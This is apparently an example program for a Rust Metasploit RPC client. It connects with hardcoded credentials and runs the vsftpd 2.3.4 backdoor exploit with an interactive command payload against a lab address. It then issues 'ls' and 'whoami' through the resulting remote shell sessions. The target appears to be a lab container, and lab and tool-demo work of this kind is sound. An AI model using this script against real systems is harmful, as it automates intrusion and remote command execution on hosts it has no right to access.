

extern crate msf_client;

use msf_client::msg::ModuleOptionRet;
use msf_client::MsfClient;
use msf_client::MsfModule;


fn main() {
    let mut client = match MsfClient::new("msf", "1234", "http://172.17.0.2:55553/api/".to_string()) {
        Ok(client) => client,
        Err(err) => { eprintln!("{}", err);
                      return
                    },
    };

    match client.core().version() {
        Ok(res) => { println!("{}", res.version);
                     println!("{}", res.ruby);
                     println!("{}", res.api);
                     res
                   }
        Err(err) => { eprintln!("{}", err);
                      return
                    },
    };

    let mut mod_man = client.modules();

//    match mod_man.exploits() {
//        Ok(res) => { let mod_names = &res.modules;
//                     for mod_name in mod_names {
//                         println!("{}", mod_name);
//                     };
//                     res
//                   }
//        Err(err) => { eprintln!("{}", err);
//                      return
//                    },

//    };

    let mut exp_mod = mod_man.use_exploit("unix/ftp/vsftpd_234_backdoor");

    println!("{}", exp_mod.info.name);
    println!("{}", exp_mod.info.description);
    println!("{}", exp_mod.info.license);

//    for (option_name, option) in &exp_mod.options {
//        println!("{}", option_name);
//        println!("{:?}", option);
//        match option {
//            ModuleOption::DefaultBool { r#type, required, advanced, desc, default } => println!("{}", required),
//            _ => println!("unknown"),
//        };
//    };
//    println!("{:?}", exp_mod.options.get("DisablePayloadHandler").unwrap().get("required"));
//    println!("{}", exp_mod.options.DisablePayloadHandler.desc);
//    println!("{:?}", exp_mod.options.get("DisablePayloadHandler").unwrap().get("desc"));
//    println!("{:?}", exp_mod.options.DisablePayloadHandler.default);
//    println!("{:?}", exp_mod.options.get("DisablePayloadHandler").unwrap().get("default"));
    
//    println!("{}", exp_mod.options.RHOSTS.required);
//    println!("{:?}", exp_mod.options.get("RHOSTS").unwrap().get("required"));
//    println!("{}", exp_mod.options.RHOSTS.desc);
//    println!("{:?}", exp_mod.options.get("RHOSTS").unwrap().get("desc"));
//    println!("{:?}", exp_mod.options.RHOSTS.default);
//    println!("{:?}", exp_mod.options.get("RHOSTS").unwrap().get("default"));

//    println!("{}", exp_mod.options.RPORT.required);
//    println!("{:?}", exp_mod.options.get("RPORT").unwrap().get("required"));
//    println!("{}", exp_mod.options.RPORT.desc);
//    println!("{:?}", exp_mod.options.get("RPORT").unwrap().get("desc"));
//    println!("{:?}", exp_mod.options.RPORT.default);
//    println!("{:?}", exp_mod.options.get("RPORT").unwrap().get("default"));

    match exp_mod.payloads() {
        Ok(res) => { let pay_names = &res.payloads;
                     for pay_name in pay_names {
                         println!("{}",pay_name);
                     };
                     res
                   }
        Err(err) => { eprintln!("{}", err);
                      return
                    },
    };

    exp_mod.run_options.insert(String::from("RHOST"), String::from("172.17.0.3"));
    exp_mod.run_options.insert(String::from("PAYLOAD"), String::from("cmd/unix/interact"));

    match exp_mod.exploit() {
        Ok(res) => println!("{:?}", res),
        Err(err) => eprintln!("{}", err),
    };

    let mut sessions = client.sessions();

    let sess_info = match sessions.list() {
        Ok(res) => { println!("{:?}", res);
                     res
                   }
        Err(err) => { eprintln!("{}", err);
                      return
                    }
    };

    for sid in sess_info.keys() {
        let mut session = match sessions.session(sid) {
            Ok(res) => res,
            Err(err) => { eprintln!("{}", err);
                          return
                        }
        };

        println!("{}", session.write(String::from("ls\n")));
        println!("{}", session.read());

        println!("{}", session.write(String::from("whoami\n")));
        println!("{}", session.read());
    }

    return
}
